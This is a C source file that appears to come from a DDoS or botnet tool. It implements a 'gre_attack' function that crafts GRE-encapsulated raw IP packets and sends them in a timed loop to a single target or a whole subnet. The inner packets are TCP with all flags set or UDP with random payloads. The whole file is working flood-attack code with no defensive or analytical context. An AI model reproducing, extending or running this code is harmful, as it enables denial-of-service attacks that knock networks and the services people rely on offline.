#define _GNU_SOURCE

#include "headers/attack_params.h"

struct grehdr {
    unsigned short flags;
    unsigned short protocol;
    unsigned short checksum;
    unsigned short reserved;
};

void* gre_attack(void* arg) {
    gre_attack_params* params = (gre_attack_params*)arg;
    if (!params) return NULL;

    int proto = IPPROTO_IP;
    if (params->gre_proto == 1) proto = IPPROTO_TCP;
    else if (params->gre_proto == 2) proto = IPPROTO_UDP;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_GRE);
    if (sock < 0) return NULL;

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        close(sock);
        return NULL;
    }
    
    const size_t ip_size = sizeof(struct iphdr);
    const size_t gre_size = sizeof(struct grehdr);
    const size_t tcp_size = sizeof(struct tcphdr);
    const size_t udp_size = sizeof(struct udphdr);
    
    size_t min_size = ip_size + gre_size + ip_size;  // Outer IP + GRE + Inner IP
    if (proto == IPPROTO_TCP) min_size += tcp_size;
    else if (proto == IPPROTO_UDP) min_size += udp_size;
    
    size_t packet_size = params->psize > 0 ? (size_t)params->psize : min_size;
    if (packet_size < min_size) packet_size = min_size;
    if (packet_size > 8192) packet_size = 8192;

    unsigned char packet[8192];
    memset(packet, 0, packet_size);
    size_t payload_offset = ip_size + gre_size + ip_size;
    size_t max_payload = packet_size > payload_offset ? packet_size - payload_offset : 0;
    size_t to_copy = (((attack_params*)params)->msg_len > 0 && ((attack_params*)params)->msg) ? (((attack_params*)params)->msg_len < max_payload ? ((attack_params*)params)->msg_len : max_payload) : 0;
    if (to_copy > 0) {
        memcpy(packet + payload_offset, ((attack_params*)params)->msg, to_copy);
    } else if (max_payload > 0) {
        for (size_t i = 0; i < max_payload; i++) {
            packet[payload_offset + i] = (unsigned char)(rand() & 0xFF);
        }
    }

    struct iphdr *iph = (struct iphdr*)packet;
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons((uint16_t)packet_size);
    iph->id = htons(getpid() & 0xFFFF);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_GRE;
    iph->check = 0;
    iph->saddr = INADDR_ANY;
    iph->daddr = params->target_addr.sin_addr.s_addr;

    struct grehdr *greh = (struct grehdr*)(packet + ip_size);
    greh->flags = htons(0x2000);
    greh->protocol = htons(0x0800);

    unsigned char *inner_packet = packet + ip_size + gre_size;
    struct iphdr *inner_iph = (struct iphdr*)inner_packet;
    inner_iph->ihl = 5;
    inner_iph->version = 4;
    inner_iph->tos = 0;
    inner_iph->tot_len = htons((uint16_t)(packet_size - ip_size - gre_size));
    inner_iph->id = htons((getpid() + 1) & 0xFFFF);
    inner_iph->frag_off = 0;
    inner_iph->ttl = 64;
    inner_iph->protocol = proto;
    inner_iph->check = 0;
    inner_iph->saddr = INADDR_ANY;
    inner_iph->daddr = params->target_addr.sin_addr.s_addr;

    uint16_t src_port = params->srcport > 0 ? (uint16_t)params->srcport : (uint16_t)(rand() % 0xFFFF);
    
    if (proto == IPPROTO_TCP) {
        struct tcphdr *tcph = (struct tcphdr*)(inner_packet + ip_size);
        if ((size_t)((unsigned char*)tcph + tcp_size - packet) > packet_size) {
            close(sock);
            return NULL;
        }
        tcph->source = htons(src_port);
        tcph->dest = params->target_addr.sin_port;
        tcph->seq = 0;
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->fin = 1;
        tcph->syn = 1;
        tcph->rst = 1;
        tcph->psh = 1;
        tcph->ack = 1;
        tcph->urg = 1;
        tcph->window = htons(16384);
        tcph->check = 0;
        tcph->urg_ptr = 0;
    } else if (proto == IPPROTO_UDP) {
        struct udphdr *udph = (struct udphdr*)(inner_packet + ip_size);
        if ((size_t)((unsigned char*)udph + udp_size - packet) > packet_size) {
            close(sock);
            return NULL;
        }
        udph->source = htons(src_port);
        udph->dest = params->target_addr.sin_port;
        udph->len = htons((uint16_t)(packet_size - ip_size - gre_size - ip_size));
        udph->check = 0;
    }

    int usleep_min = params->usleep_min > 0 ? params->usleep_min : 0;
    int usleep_max = params->usleep_max > 0 ? params->usleep_max : 0;
    int use_usleep = usleep_min > 0;
    time_t end_time = time(NULL) + params->duration;
    if (((attack_params*)params)->cidr > 0) {
        uint32_t base = ntohl(((attack_params*)params)->base_ip);
        uint32_t mask = ((attack_params*)params)->cidr == 32 ? 0xFFFFFFFF : (~0U << (32 - ((attack_params*)params)->cidr));
        uint32_t start = base & mask;
        uint32_t end = start | (~mask);
        struct sockaddr_in dest_addr = params->target_addr;
        while (params->active && time(NULL) < end_time) {
            if (((attack_params*)params)->cidr == 32) {
                dest_addr.sin_addr.s_addr = htonl(start);
                iph->daddr = dest_addr.sin_addr.s_addr;
                inner_iph->daddr = dest_addr.sin_addr.s_addr;

                uint16_t src_port = params->srcport > 0 ? (uint16_t)params->srcport : (uint16_t)(rand() % 0xFFFF);
                if (proto == IPPROTO_TCP) {
                    struct tcphdr *tcph = (struct tcphdr*)(inner_packet + ip_size);
                    size_t min_tcp_size = ip_size + gre_size + ip_size + tcp_size;
                    if ((size_t)((unsigned char*)tcph + tcp_size - packet) > packet_size || packet_size < min_tcp_size) {
                        break;
                    }
                    tcph->source = htons(src_port);
                    tcph->seq = 0;
                    tcph->check = 0;
                    tcph->check = tcp_udp_checksum(tcph, 
                                                 (size_t)(ntohs(inner_iph->tot_len) - ip_size),
                                                 inner_iph->saddr, inner_iph->daddr, IPPROTO_TCP);
                } else if (proto == IPPROTO_UDP) {
                    struct udphdr *udph = (struct udphdr*)(inner_packet + ip_size);
                    size_t min_udp_size = ip_size + gre_size + ip_size + udp_size;
                    if ((size_t)((unsigned char*)udph + udp_size - packet) > packet_size || packet_size < min_udp_size) {
                        break;
                    }
                    udph->source = htons(src_port);
                    udph->check = 0;
                    udph->check = tcp_udp_checksum(udph, 
                                                 (size_t)(ntohs(inner_iph->tot_len) - ip_size),
                                                 inner_iph->saddr, inner_iph->daddr, IPPROTO_UDP);
                }

                if (packet_size < ip_size + gre_size + ip_size) {
                    break;
                }

                inner_iph->check = 0;
                inner_iph->check = generic_checksum(inner_iph, ip_size);
                
                greh->checksum = 0;
                greh->reserved = 0;
                greh->checksum = generic_checksum(greh, packet_size - ip_size);

                iph->check = 0;
                iph->check = generic_checksum(iph, ip_size);

                sendto(sock, packet, packet_size, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
                if (use_usleep) { int delay = usleep_min; if (usleep_max > usleep_min) delay += rand() % (usleep_max - usleep_min + 1); usleep(delay); }
            } else if (((attack_params*)params)->cidr == 31) {
                //31 fix (skip .256/)
                dest_addr.sin_addr.s_addr = htonl(start);
                iph->daddr = dest_addr.sin_addr.s_addr;
                inner_iph->daddr = dest_addr.sin_addr.s_addr;
                sendto(sock, packet, packet_size, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
                dest_addr.sin_addr.s_addr = htonl(end);
                iph->daddr = dest_addr.sin_addr.s_addr;
                inner_iph->daddr = dest_addr.sin_addr.s_addr;
                sendto(sock, packet, packet_size, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
            } else {
                // subnet mode
                for (uint32_t ip = start + 1; ip < end; ++ip) {
                    dest_addr.sin_addr.s_addr = htonl(ip);
                    iph->daddr = dest_addr.sin_addr.s_addr;
                    inner_iph->daddr = dest_addr.sin_addr.s_addr;
                    sendto(sock, packet, packet_size, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
                }
            }
        }
    } else {
        // single IP mode
        while (params->active && time(NULL) < end_time) {
            sendto(sock, packet, packet_size, 0, (struct sockaddr*)&params->target_addr, sizeof(params->target_addr));
            if (use_usleep) { int delay = usleep_min; if (usleep_max > usleep_min) delay += rand() % (usleep_max - usleep_min + 1); usleep(delay); }
        }
    }
    close(sock);
    params->active = 0;
    return (void*)1;
}
